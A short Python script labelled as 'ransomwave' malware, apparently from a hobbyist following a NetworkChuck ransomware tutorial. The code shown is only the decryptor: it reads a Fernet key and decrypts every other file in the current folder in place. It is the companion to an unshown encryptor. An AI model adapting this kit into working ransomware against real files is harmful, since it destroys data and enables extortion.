#ransomwave malaware by LaMassa07 (ft. NetworkChuck)

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransomwave.py"or file == "decrypt.py" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

for file in files:
	with open(file, "rb") as thefile:
		content = thefile.read()
	contents_decrypted = Fernet(secretkey).decrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted)
